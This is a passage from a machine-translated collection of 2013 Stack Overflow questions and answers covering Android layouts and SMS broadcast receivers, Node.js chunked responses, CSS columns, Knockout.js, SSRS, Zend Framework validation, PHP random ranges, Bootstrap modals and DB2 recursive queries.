            android:layout_alignLeft="@+id/btnMyProfile"
            android:background="@drawable/allworkouts" />

        <Button
            android:id="@+id/btnAllExercises"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_above="@+id/btnTaracker"
            android:layout_alignParentRight="true"
            android:layout_marginRight="40dp"
            android:background="@drawable/allexercises" />

            </RelativeLayout>
            </LinearLayout>

            </LinearLayout>` 
```

我需要创建与所有屏幕尺寸兼容的布局，为 xlarge 尺寸（800x1280、720x1280 等）创建单独的布局。在这里，由于声誉，我无法上传图片，需要在布局的中心放置一个主按钮，在中间按钮的左右两侧弯曲放置 3 个按钮。请任何人都可以帮助我创建与所有屏幕尺寸兼容的布局使用 dp 或定点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T05:58:54.380

你可以使用`android:layout_weight`属性。它将允许您使用百分比来定义您的按钮。

对于 EX：

```
 <LinearLayout
android:layout_width="fill_parent" 
android:layout_height="wrap_content"
android:weightSum="1.0" >

    <Button
        android:text="left" 
        android:layout_width="0dp" 
        android:layout_height="wrap_content" 
        android:layout_weight=".50" /> 

    <Button
        android:text="right" 
        android:layout_width="0dp" 
        android:layout_height="wrap_content" 
        android:layout_weight=".50" />

</LinearLayout> 
```

现在您已经为按钮指定了百分比值，因此它们将在任何大小的屏幕上显示为它们在整个屏幕中的百分比值。

这可以在此[链接](https://stackoverflow.com/questions/4961355/percentage-width-in-a-relativelayout)`LinearLayout`上`RelativeLayout`检查第二个答案

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T06:39:05.623

如问题中所述，您希望将按钮弯曲地放置在中心按钮的左右两侧，您可以查看链接以了解如何完成此操作：[https ://github.com/daCapricorn/ ArcMenu](https://github.com/daCapricorn/ArcMenu) 这是一个开源项目，我称之为创建类似路径的菜单。

# android - 在活动不活动时接收广播

> ID：16184090
> 
> 赞同：0
> 
> 时间：2013-04-24T05:34:29.630
> 
> 标签：android, broadcastreceiver

我想拦截传入的消息，所以我创建了一个扩展 BroadcastReceiver 的类（如此[处](https://stackoverflow.com/questions/11306150/read-and-display-incoming-message-text-android)给出）它工作但我想控制接收器（在需要时停止它）我实现[了这个](https://stackoverflow.com/questions/7439041/how-to-unregister-broadcastreceiver)但现在当我退出活动时接收器没有工作。

如何实现接收器，以便在活动不运行时可以控制和接收广播？

主要活动

```
public class MainActivity extends Activity {
    Button StopB;
    IntentFilter STARTER;
    final BroadcastReceiver MSgR=new BR();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        StopB=(Button) findViewById(R.id.button1);
        final BroadcastReceiver MSgR=new BR();
        STARTER=new IntentFilter();
        STARTER.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(MSgR, STARTER);

    StopB.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View arg0) {
            // TODO Auto-generated method stub
            Log.i("Pressed", "UNRGSTR");
            unregisterReceiver(MSgR);
        }
    } ) ;

    } 
```

BR.java

```
 public class BR extends BroadcastReceiver{
String TAG="DELETE BLOCK";
    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO Auto-generated method stub

        // do something here
         } 
```

显现

```
 <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="17" />
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <activity
            android:name="com.example.delete_sms_2.MainActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <receiver android:name="BR"></receiver>
    </application>

</manifest> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-24T06:23:33.497

定义接收器何时开始，您定义活动何时开始然后接收工作，您需要更改清单文件，就像收到短信时在这个意图过滤器中一样，就像您根据您的需要更改它一样谢谢

```
 <receiver android:name=".HellowordActivity" >
            <intent-filter > 
            <action android:name="android.provider.Telephony.SMS_RECEIVED"/> 
            </intent-filter> 
    </receiver> 
```

# c# - if (index & 0x88) == 0，这是如何工作的？

> ID：16184092
> 
> 赞同：0
> 
> 时间：2013-04-24T05:34:37.480
> 
> 标签：c#

谁能告诉我这个操作是如何工作的？索引是数字，它可以是 0 到 128 之间的任何数字。我只是不明白 (index & 0x88) 如何为 0 或不为 0。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T05:37:24.733

`0x88`相当于`10001000`二进制。因此，它将是`0`iff 索引的二进制值是`0xxx0xxx`，其中`x`是任何二进制数字。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-24T05:39:50.700

& 运算符是按位与，如果 0x88 的二进制数字和索引中对应的点都是 1，则不会 == 0。相反的情况，如果没有一个数字都是 1，则 & 的结果将是 0

在这种情况下，您的十六进制数 88 在二进制中是 10001000，因此 (index & 10001000) 可以等于 0，只要 index 在它的第 4 和第 8 位置有 0（例如，01110111）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T05:37:24.437

`&`是`bitwise and`运算符（应用于数字时）。

例如，`110 & 101 = 100`

`0x88`是`10001000`二进制的。

# javascript - 在wordpress中提交表单后如何刷新页面

> ID：16184096
> 
> 赞同：-3
> 
> 时间：2013-04-24T05:35:11.650
> 
> 标签：javascript, html, wordpress

如何在 word press 中提交表单后刷新页面。首先我尝试了 location.reload(); 以及我从搜索引擎获得的更多示例，但没有任何效果。我尝试通过 id 获取文本字段，但也没有用。下面是我尝试过的代码。谁能帮我？？

--> 姓名 电子邮件 电话 无 地址 主题 消息 在此处输入代码 有关我们教区联系人的信息：单击此处

--> //

window.history.forward(1); 函数 noBack() { window.history.forward(); } -->

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T05:51:42.497

```
<a href="" OnClick="window.close()">Close Window</a> 
```

如果你想在一段时间后关闭它......

添加 `onLoad="setTimeout('window.close()', 5000);`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:00:21.690

你试过 JavaScript 吗？[如何在浏览器窗口中关闭当前选项卡？](https://stackoverflow.com/questions/2076299/how-to-close-current-tab-in-a-browser-window)

```
<a href="blablabla" onclick="setTimeout(function(){var ww = window.open(window.location, '_self'); ww.close(); }, 1000);">
    If you click on this the window will be closed after 1000ms
</a> 
```

或者也可能是 jQuery？[如何捕获浏览器窗口关闭事件？](https://stackoverflow.com/questions/1631959/browser-window-close-event)

# c++ - 如何使用 C++ 库实现数据包整形或 QOS？

> ID：16184101
> 
> 赞同：1
> 
> 时间：2013-04-24T05:35:34.303
> 
> 标签：c++, c, linux, ubuntu

我有一个与在 linux 中使用 c++ 进行网络相关的问题。

**描述**

我正在尝试构建一个可以控制每个客户端的带宽的客户端管理系统。我试图在很多地方寻找答案。我最终进入了LARTC。我认为 LARTC 提供了一个脚本机制来做到这一点。但我想知道 linux（Ubuntu 13.04 beta）中的纯编程方法或 c 编程语言的头文件（可以与网络堆栈通信 - 如果有的话）。

示例：我在 C++ 中找到了一个名为 Qos.h 的头文件。网络（适用于 Windows）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T08:15:38.020

几个相关问题：

我认为不存在开箱即用的解决方案（在 C/C++ API 的意义上）。

[如何以编程方式即时管理 iptables 规则？](https://stackoverflow.com/questions/109553/how-can-i-programmatically-manage-iptables-rules-on-the-fly)

[如何以编程方式访问 iptables？](https://stackoverflow.com/questions/8603134/how-to-programmatically-access-iptables)

# node.js - 如何在 NodeJS 中刷新任意大小的块

> ID：16184103
> 
> 赞同：3
> 
> 时间：2013-04-24T05:35:37.327
> 
> 标签：node.js, http, flush, chunks

在 Node Web 服务器中，我想在特定点刷新 HTML 内容，如下所示：

*   第一个块：`<html><head> ... </head>`
*   第二块：`<body> ... </body>`
*   第三块：`</html>`

例如：

```
var http = require('http');

http.createServer(function (req, res) {
  res.writeHead(200, {'Content-Type': 'text/html'});

  res.write('<html><head> ... </head>');                                           

  setTimeout(function() {                                                          
    res.write('<body> ... </body>');                                               

    setTimeout(function() {                                                        
      res.end('</html>');                                                          
    }, 2000);                                                                      

  }, 2000);

}).listen(8000); 
```

上面的代码在单个块中约 4 秒后响应`<html><head> ... </head><body> ... </body></html>`，但是我注意到块应该 >= 4096bytes 以便立即刷新：

```
var http = require('http');

http.createServer(function (req, res) {                                            
  res.writeHead(200, {'Content-Type': 'text/plain'});                              

  res.write(Array(4097).join('*'));

  setTimeout(function() {                                                          
    res.write(Array(4097).join('#'));

    setTimeout(function() {                                                        
      res.end('done!');                                                            
    }, 2000);

  }, 2000);

}).listen(8000); 
```

上面代码的响应也需要大约 4 秒，但块会立即刷新。我可以填充小块以填充至少 4096 字节，只是想知道是否还有另一种“非 hacky”方式。

在 PHP 中，这可以通过`flush()`/`ob_flush()`和禁用来实现`output_buffering`

FWIW，我正在构建一个 Web 服务器工具来试验 HTML 块输出的几种配置，它们之间具有给定的延迟，以便分析现代浏览器如何处理它并选择最佳配置。

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-05-01T04:56:15.220

这是一个半重复的[这个问题](https://stackoverflow.com/questions/14540335/node-js-i-cant-reproduce-progressive-response-from-server/14540584#14540584)。

答案是已经做了你想要的，只是浏览器不会解析和显示任何东西，直到它收到足够的数据来解析它。发送 4097 块可以让浏览器推动解析部分文档，它不会推动 Node 以不同的方式发送块。

`curl`如果您将其置于非缓冲模式，您可以使用它进行测试。

```
curl -N localhost:8000 
```

# html - 浮动和填充 - 等高

> ID：16184105
> 
> 赞同：0
> 
> 时间：2013-04-24T05:35:52.503
> 
> 标签：html, css, css-float

我有一个带有容器和两列的页面。我的结构看起来像这样

```
<div id="page">
    <div id="left"></div>
    <div id="right"></div>
</div> 
```

这是CSS

```
#page {
    min-height: 100%;
    height: 100%;
    width: 90%;
    font-size: 100%;
    margin: 0 auto 0 auto;
    padding: 0;
    font-size: 1em;
    position: relative;
}

#left {
    background-image: url("../images/layout/background.png");
    width: 198px;
    min-height: 100%;
    float: left;
}

#right {
    margin-left: 230px;
    min-height: 100%;
    background-color: #FFFFFF;
    border: 1px solid red;
    padding: 150px 20px 0px 20px;
    text-align: justify;
} 
```

目前，使用前面的代码，`#page`元素不会延伸到底部，`#left`. 如果我从 , 中删除填充物`#right`，`#page`并且`#left`与`#right`.

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T05:50:31.457

所以有几种方法可以处理这个问题。如果您希望只有两列具有不同背景且都到达其容器底部，则可以使用垂直重复的背景图像或 css3 渐变。我在这里设置了一个例子：

[http://jsfiddle.net/29wBn/1/](http://jsfiddle.net/29wBn/1/)

注意#page 元素上的渐变背景

```
#page {
    background: -moz-linear-gradient(left, #b2f8ff 0%, #b2f8ff 50%, #9effaf 50%, #9effaf 100%); /* FF3.6+ */
    background: -webkit-gradient(linear, left top, right top, color-stop(0%,#b2f8ff), color-stop(50%,#b2f8ff), color-stop(50%,#9effaf), color-stop(100%,#9effaf)); /* Chrome,Safari4+ */
    background: -webkit-linear-gradient(left, #b2f8ff 0%,#b2f8ff 50%,#9effaf 50%,#9effaf 100%); /* Chrome10+,Safari5.1+ */
    background: -o-linear-gradient(left, #b2f8ff 0%,#b2f8ff 50%,#9effaf 50%,#9effaf 100%); /* Opera 11.10+ */
    background: -ms-linear-gradient(left, #b2f8ff 0%,#b2f8ff 50%,#9effaf 50%,#9effaf 100%); /* IE10+ */
    background: linear-gradient(to right, #b2f8ff 0%,#b2f8ff 50%,#9effaf 50%,#9effaf 100%); /* W3C */
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#b2f8ff', endColorstr='#9effaf',GradientType=1 ); /* IE6-9 */
    overflow:hidden; /* make the container wrap the floated contents */
} 
```

作为后备，#page 元素被分配左列颜色，右列接收它自己的颜色。

Chris Coyer 写了一篇很棒的文章，展示了几种不同的方式。 [http://css-tricks.com/fluid-width-equal-height-columns/](http://css-tricks.com/fluid-width-equal-height-columns/)

# javascript - 奇怪的淘汰赛js选择选项绑定问题

> ID：16184106
> 
> 赞同：0
> 
> 时间：2013-04-24T05:35:53.373
> 
> 标签：javascript, knockout.js

有人有时间来看看我在使用 Knockout JS 和绑定选择列表时遇到的一个令人费解的问题吗？

应该通过在选择列表中调用`value: favColorId`来选择列表中的人喜欢的颜色，而不是基于函数的调用`value: favColorId()`，这里发生了很奇怪的事情，我过去从未使用过（），这也导致了一些其他奇怪的问题，它不会将值召回到跨度中（因此更改所选项目无济于事）。我已经尝试重新创建一个简单的示例，尽我所能证明这个问题。

[http://jsfiddle.net/goneale/ph8Jw/](http://jsfiddle.net/goneale/ph8Jw/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:26:17.753

> 我已经包含了我的`mapDictToArray()`函数，但它只是将一个 javascript 对象转换为一个键值 JS 数组。我认为这不会导致问题。

实际上，这是问题的一部分。该函数返回一个 JavaScript 数组，而不是一个可观察的数组，因此 Knockout 无法正确使用该数组。我对您的代码进行了以下更改：

```
// The "mapDictToArray" makes a normal JS array, not a ko.observableArray();
// You can't simply "merge" a JS array with an observableArray(); you'll need
// some extra functionality for that: ko.utils.arrayPushAll()
// viewModel.colors(mapDictToArray(dict));
ko.utils.arrayPushAll(viewModel.colors(), mapDictToArray(dict));

// Apply the bindings *after* you've added the contents to the "colors" observable, in order to
// get the correct selected value
ko.applyBindings(viewModel); 
```

这应该可以解决问题（使用正确的 HTML 没有`()`）！

[JSF](http://jsfiddle.net/ph8Jw/26/)中。

**更新**

我考虑了我的解决方案，但有些地方不正确。唯一正确的是在添加可观察颜色的内容*后需要应用绑定的部分。*[这是你的小提琴](http://jsfiddle.net/ph8Jw/31/)，那部分向下移动。

这适用*于您的情况*，但是`arrayPushAll`当`observableArray`. 此方法会合并，而您在不使用它时会覆盖它（[例如 observable 中的数据](http://jsfiddle.net/ph8Jw/30/)）。

# ssrs-2008 - Rdl文件查看全屏

> ID：16184107
> 
> 赞同：1
> 
> 时间：2013-04-24T05:35:54.743
> 
> 标签：ssrs-2008, reporting-services, rdl

我在我的项目中使用 ssrs 报告。我设计了一个 A4 大小的 rdl 文件。我的问题是当我在报表查看器中看到它时，它与屏幕宽度相比显得非常小。所以我想知道是否有任何方法可以在不影响页面大小的情况下查看屏幕宽度的rdl？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T06:53:36.480

如果您在应用程序中使用报表查看器控件，则在访问报表时，您可以设置以下报表查看器属性

```
reportViewer1.SetDisplayMode(DisplayMode.Normal);
reportViewer1.ZoomMode = ZoomMode.Percent; 
```

您可以使用 FullMode、PageWidth 或 Percent 来测试 ZoomMode，看看哪种方式最适合您的场景

在我的一份报告中，我遇到了从详细报告回溯到主报告的问题，并使用下面的代码段来更正显示问题

```
private void reportViewer1_Back(object sender, BackEventArgs e)
    {
        reportViewer1.SetDisplayMode(DisplayMode.Normal);
        reportViewer1.ZoomMode = ZoomMode.Percent;
    } 
```

# android - 在 android 中使用 Twitter4j，在库中出现 lint 错误 - 库中的包引用无效

> ID：16184109
> 
> 赞同：10
> 
> 时间：2013-04-24T05:35:56.197
> 
> 标签：android, twitter4j, android-lint

我在一个 android 应用程序中使用 twitter4j 来使用 twitter API。一切正常，我对图书馆没有任何问题。今天我运行 lint 并在 twitter4j-core-3.0.3.jar 中遇到 lint 错误。我无法控制这个第三方库，所以应该怎么做。

lint 错误如下：

库中的包引用无效；不包含在 Android 中：javax.management.openmbean。引用自 twitter4j.management.APIStatisticsOpenMBean。

> **问题：** *查找对 Android 不支持的 API 的 API 访问*
> 
> **标识：** *无效包*
> 
> 此检查会扫描库以查找对 Android 中未包含的 API 的调用。
> 
> 创建 Android 项目时，会设置类路径，以便您只能访问 Android 中包含的 API 包中的类。但是，如果您将其他项目添加到您的 libs/ 文件夹，则无法保证这些 .jar 文件是使用特定于 Android 的类路径构建的，特别是它们可能正在访问不受支持的 API，例如 java.applet。
> 
> 此检查扫描库 jar 并查找对未包含在 Android 中的 API 包的引用并标记这些。如果您的代码调用最终引用不受支持的包的库类之一，这只是一个错误。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2014-01-31T01:06:42.477

如果你从命令行运行 Lint，你可以在你的项目目录中提供一个***lint.xml***并使用以下配置来忽略 twitter4j jar 文件。

```
<?xml version="1.0" encoding="UTF-8"?>
<lint>
    <issue id="InvalidPackage">
        <ignore path="libs/twitter4j-core-3.0.5.jar" />
    </issue>
</lint> 
```

可以在[http://developer.android.com/tools/help/lint.html找到 Lint 的命令行选项](http://developer.android.com/tools/help/lint.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-05-03T11:53:57.460

目前我刚刚将 lint 配置为忽略错误并将其显示为警告：在 eclipse 中执行此操作转到 Preferences-> Android -> Lint Error Checking，并将“InvalidPackage”的严重性更改为“Warning”或“Information” ”或“忽略”。

![在此处输入图像描述](https://i.stack.imgur.com/5GPvI.png)

# zend-framework2 - 如何在 zend 框架 2 中从控制器添加表单验证

> ID：16184111
> 
> 赞同：0
> 
> 时间：2013-04-24T05:36:01.067
> 
> 标签：zend-framework2, zend-validate

我试图从我的控制器添加一个验证，如下所示。但它总是显示这个

```
 if ($request->getPost('ownerType') == "Company") {

        $form->getInputFilter()->get('companyName')->getValidatorChain()->addValidator('required');
    } 
```

显示错误。我对以下错误感到困惑。

```
Catchable fatal error: Argument 1 passed to Zend\Validator\ValidatorChain::addValidator() must implement interface Zend\Validator\ValidatorInterface, string given, called in E:\xampp\htdocs\hossbrag\module\WebApp\src\WebApp\Controller\JobController.php on line 177 and defined in E:\xampp\htdocs\hossbrag\vendor\zendframework\zendframework\library\Zend\Validator\ValidatorChain.php on line 100 
```

我的控制器在这里

```
<?php

namespace WebApp\Controller;

use Zend\Mvc\Controller\AbstractActionController;
use Zend\View\Model\ViewModel;
use WebApp\Entity\User;
use Zend\View\Model\JsonModel;
use vendor\mpdf\mpdf;

class JobController extends AuthenticatedController
{
public function createAction()
    {
$form = new \WebApp\Form\JobpostingForm();
        $form->get('companyName')->setValueOptions($company);

        $checkAgreement = true;

        $request = $this->getRequest();
        if ($request->getPost('ownerType') == "Company") {

            $form->getInputFilter()->get('companyName')->getValidatorChain()->addValidator('required');
        }
}
} 
```

应该在我的控制器中更改什么以获得适当的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:30:32.660

如果您遇到如此明显的错误，只需查看来源；）

第一个要检查的是[`Zend\Validator\ValidatorInterface`](https://github.com/zendframework/zf2/blob/master/library/Zend/Validator/ValidatorInterface.php). 错误向您显示，实现此接口的类除外。查看您将看到的代码，该函数需要一个类，而不仅仅是一个字符串。

但是由于您对 ZF 有点习惯，很明显您知道还有其他方法可以添加东西。那么让我们来看看[`Zend\InputFilter\InputFilter#add()`](https://github.com/zendframework/zf2/blob/master/library/Zend/InputFilter/InputFilter.php#55)。您会看到该`add()`函数的第一个参数确实要求一个实现`ValidatorInterface`. 但它也接受其他一些东西：

```
/**
 * Add an input to the input filter
 *
 * @param  array|Traversable|InputInterface|InputFilterInterface $input
 * @param  null|string $name
 * @return InputFilter
 */
public function add($input, $name = null)
{
    //...
} 
```

它还接受`array`、`Traversable`和。所以选择是有的。`InputInterface``InputFilterInterface`

现在，我自己从来没有这样做过，我真诚地希望这能奏效（如果不是我糟透了！），但假设你使用的是数组语法，你所要做的就是：

```
[...]->getValidatorChain()->add(array(
    'type' => 'Zend\Validator\NotEmpty'
)); 
```

让我知道这是否适合您；）

# c++ - 使用模板进行参数转换时出错

> ID：16184112
> 
> 赞同：0
> 
> 时间：2013-04-24T05:36:03.367
> 
> 标签：c++, templates

我有一个函数模板，它接受一个向量和一个给定类型的元素，并返回该元素在向量中的位置。这是此函数模板的代码：

```
template<class T>
int findElement(const vector<T> &vec, const T &ele)
{
    for(size_t i = 0; i < vec.size(); i++)
    {
        if(ele == vec[i])
            return i;
    }
    return -1;
} 
```

这是函数调用：

```
findElement<double>(intVec, ele); 
```

但是当我调用该函数时出现此错误：

```
error C2664: 'findElement' : cannot convert parameter 1 from 'std::vector<_Ty>' to 'const std::vector<_Ty,_Ax> &' 
```

即使我删除`const`了函数模板定义中的向量，这个错误也是一样的：

```
error C2664: 'findElement' : cannot convert parameter 1 from 'std::vector<_Ty>' to 'std::vector<_Ty,_Ax> &' 
```

但是，当我将函数调用为

```
findElement(intVec, ele) 
```

我没有收到任何错误。

这种行为的原因是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T05:37:55.153

似乎编译器无法转换`vector<double>`为`vector<int>`. 因为从逻辑`intVec`上讲，是整数向量，不是吗？你说编译器，你想要`vector`双打。您无法转换`vector<T>`为`vector<U>`，因为`vector`没有追随者`conversion constructor`，这很好。

# sitecore - Sitecore 报告 - 如何添加过滤器 (DMS v6.5)

> ID：16184114
> 
> 赞同：0
> 
> 时间：2013-04-24T05:36:09.003
> 
> 标签：sitecore, sitecore6, sitecore-dms

需要想办法在我的报告中添加一个新的过滤器。我怎样才能在 DMS 中做到这一点。

我可以使用 Analytics 创建过滤器，但在报告定义项中无法将该过滤器链接到报告。

请帮忙！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T05:44:51.127

明白了！

[这是解决方案...](http://webcmd.wordpress.com/2012/07/19/adding-site-filters-to-dms-reports-with-sitecore-6-5/)

# php - PHP中没有重复的随机范围

> ID：16184116
> 
> 赞同：1
> 
> 时间：2013-04-24T05:36:23.100
> 
> 标签：php, html, random

我有 60 张图片，但我想从 1 到 60 随机显示 20 张。

我的代码是这样的，它显示 60

```
<?php
  for( $i = 1; $i < 61; $i++ ) 
    { 
       print '<a href="javascript:;"><img src="images/items/' . $i . '.png"  class="allitems item' . $i . '" /></a>'; 
    }    
?> 
```

我找到了 PHP 函数 RAND()，但无法实现，任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-24T05:40:52.847

尝试功能[`range()`](http://php.net/manual/en/function.range.php)和[`array_rand()`](http://php.net/manual/en/function.array-rand.php)：

```
<?php
// range generates array with direct sequence from 1 to 60 (inclusive).
// array_rand extracts 20 random keys from it.
$range = array_rand(range(1, 60), 20);

while(count($range)){
    $i = array_shift($range) + 1;

    print '<a href="javascript:;"><img src="images/items/' . $i . '.png"  class="allitems item' . $i . '" /></a>';
}
?> 
```

* * *

***UPDv1：***使用`for`-loop：

```
<?php
$range = array_rand(range(1, 60), 20);

for($i = 0; $i < 20; $i++){
    $image = $range[$i] + 1;

    print '<a href="javascript:;"><img src="images/items/' . $image . '.png"  class="allitems item' . $image . '" /></a>';
}

unset($range, $i, $image);
?> 
```

* * *

***UPDv2：***

我看错了[`array_rand()`](http://php.net/manual/en/function.array-rand.php)手册。它返回数组*键*而不是*元素*。这是多用途版本（用 修复[`array_flip()`](http://php.net/manual/en/function.array-flip.php)）：

```
<?php
header('Content-Type: text/plain');

$buffer = range(1, 60);
$buffer = array_flip($buffer);
$buffer = array_rand($buffer, 20);

foreach($buffer as $value){
    echo $value, PHP_EOL;
}
?> 
```

还有一个快捷功能（底片安全，整体计数安全）：

```
<?php
header('Content-Type: text/plain');

function random_range($min, $max, $count){
    $count = abs((int)$count);

    if($min > $max){
        list($min, $max) = array($max, $min);
    }

    $uniques = abs($max - $min);

    if($count > $uniques)$count = $uniques;

    return array_rand(array_flip(range($min, $max)), $count);
}

foreach(random_range(1, 60, 20) as $value){
    echo $value, PHP_EOL;
}
?> 
```

* * *

对于那些需要非增长随机序列的人来说，还有另一种方法。用这个：

```
<?php
header('Content-Type: text/plain');

function random_range($min, $max, $count){
    $count = abs((int)$count);

    if($min > $max){
        list($min, $max) = array($max, $min);
    }

    $uniques = abs($max - $min);

    if($count > $uniques)$count = $uniques;

    $result = array();
    $ready  = 0;

    while($ready < $count){
        $buffer = rand($min, $max);

        if(!in_array($buffer, $result)){
            $result[] = $buffer;
            $ready++;
        }
    }

    return $result;
}

foreach(random_range(1, 60, 20) as $value){
    echo $value, PHP_EOL;
}
?> 
```

* * *

***UPDv3：***

另一种方式，使用[`range()`](http://php.net/manual/en/function.range.php)++ [`shuffle()`](http://php.net/manual/en/function.shuffle.php)：[`array_slice()`](http://php.net/manual/en/function.array-slice.php)

```
<?php
header('Content-Type: text/plain');

function random_range($min, $max, $count){
    $count = abs((int)$count);

    if($min > $max){
        list($min, $max) = array($max, $min);
    }

    $uniques = abs($max - $min);

    if($count > $uniques)$count = $uniques;

    $result = range($min, $max);
    shuffle($result);

    return array_slice($result, 0, $count);
}

foreach(random_range(5, 20, 5) as $random){
    echo $random, ' ';
}
?> 
```

# javascript - 如何检测在引导程序中单击显示的按钮类

> ID：16184119
> 
> 赞同：-1
> 
> 时间：2013-04-24T05:36:25.073
> 
> 标签：javascript, jquery, css, twitter-bootstrap

我有以下元素

```
<button type="button" class='launch' data-toggle="modal" data-target="#myModal">Launch modal</button>
<button type="button" class='boom' data-toggle="modal" data-target="#myModal"> Boom </button> 
```

我有一个事件监听器：

```
$('#myModal').on('show', function () {   

       // how do I check if button has class launch or boom? 
}) 
```

如何检查按钮在函数内是否有类启动或繁荣？或者换句话说，问题是我如何在这个函数中获得触发这个动作的按钮。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:24:32.020

您可以为每个按钮添加一个单独的类`.modalBtn`，例如并执行以下操作：

```
$('.modalBtn').click(function() {
if ($(this).hasClass('launch')) showModal($('.launch'));
else if ($(this).hasClass('boom')) showModal($('.boom'));
});

function showModal( $btn ) {

//insert code to show modal (you can find it in the bootstrap javascript docs. Now you have $btn object to use.

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T05:39:02.350

使用 jQuery [.hasClass](http://api.jquery.com/hasClass/)方法检查类是否存在。

```
$('#element').hasClass('launch'); // returns true or false; 
```

试试下面的代码。请将`.myModalbtn`类添加到两个按钮

```
$('.myModalbtn').on('hidden', function () {   

       $(this).hasClass('launch')) // if the it has launch class -> returns true else false;
}); 
```

# database - 通过先验连接 DB2

> ID：16184128
> 
> 赞同：0
> 
> 时间：2013-04-24T05:36:52.467
> 
> 标签：database, oracle, db2

我对分层查询有疑问，以下查询在 Oracle 中有效，但在 DB2 中无效

如果我们从芝加哥开始旅程，它将检索可能的目的地。

```
SELECT   origin, departure, arrival
FROM  schema001."FLIGHTS"
START WITH departure = 'Chicago'
CONNECT BY PRIOR arrival = departure; 
```

任何人都可以帮助我，我们如何在 DB2 中编写查询

在此先感谢拉杰什

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:56:39.930

您可以使用递归公用表表达式。

像这样的东西：

```
with ftree (origin, departure, arrival) as (
   select origin, 
          departure, 
          arrival
   from flights
   where departure = 'Chicago'
   union all
   select c.origin,
          c.departure,
          c.arrival
   from flights c
      join ftree p on c.arrival = p.departure
)
select *
from ftree; 
```

（未测试，目前手头没有 DB2）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T10:09:44.300

干杯....我得到了解决方案，工作解决方案是....

```
WITH rajesh(departure, arrival) AS 
(
select departure, arrival from ALERTS_TEST.flights where departure = 'Chicago'
    UNION ALL
select nplus1.departure, nplus1.arrival  from ALERTS_TEST.flights as nplus1, rajesh
    WHERE rajesh.arrival = nplus1.departure
) 
SELECT departure, arrival FROM rajesh; 
```

我已经在 db2 v9.7 和 sqlserver 2005 中检查了上述查询。它工作正常...感谢您的帮助 a_horse_with_no_name

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T16:48:34.113

您没有提到 DB2 在哪个操作系统上运行。

在 IBM i OS 7.1 上运行的 DB2 for i*确实*具有[分层查询](http://pic.dhe.ibm.com/infocenter/iseries/v7r1m0/index.jsp?topic=%2Fdb2%2Frbafzhierquery.htm)，但语法略有不同。

```
SELECT   origin, departure, arrival
  FROM  schema001.FLIGHTS
  START WITH departure = 'Chicago'
  CONNECT BY arrival = PRIOR departure; 
```

不幸的是，我不相信这将适用于 DB2 for LUW 或 z/OS。也许在未来的版本中。

# java - 将输入流转换为pdf到字节数组

> ID：16184130
> 
> 赞同：0
> 
> 时间：2013-04-24T05:36:57.890
> 
> 标签：java, salesforce, mule

我创建了一个 mule 流，它接受一个文件作为输入流并转换为字节数组并将该文件附加到特定的 SalesForce 案例。我是否可以将文件（作为输入流）转换为 pdf 格式并附加到 Salesforce 案例。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T05:38:47.210

PDF 是一种特殊格式，因此不会直接创建 PDF。您可以使用 Apache FOP 或 iText 等库来创建 PDF 输出。

# php - 带有 php 表单验证的 jQuery 弹出窗口

> ID：16184131
> 
> 赞同：0
> 
> 时间：2013-04-24T05:37:03.423
> 
> 标签：php, forms, jquery-plugins, bpopup

我有一个注册页面

```
<form class="register" action="regist.php" method="post" >
                    <h3>Register</h3>
                    <div class="column">
                        <div>
                            <label>First Name:</label>
                            <input type="text" name="f_name"/>
                            <span ></span>
                        </div>
                        <div>
                            <label>Last Name:</label>
                            <input type="text" name="l_name"/>
                            <span class="error">This is an error</span>
                        </div>
                        <div>
                            <label>mobile:</label>
                            <input type="text" name="mobile"/>
                            <span class="error">This is an error</span>
                        </div>
                    </div>
                    <div class="column">
                        <div>
                            <label>Username:</label>
                            <input type="text"name="user"/>
                            <span >This is an error</span>
                        </div>
                        <div>
                            <label>Email:</label>
                            <input type="text" name="email"/>
                            <span class="error">This is an error</span>
                        </div>
                        <div>
                            <label>Password:</label>
                            <input type="password" name="pass"/>
                            <span class="error">This is an error</span>
                        </div>
                    </div>
                    <div class="bottom">
                        <div class="remember">

                        </div>
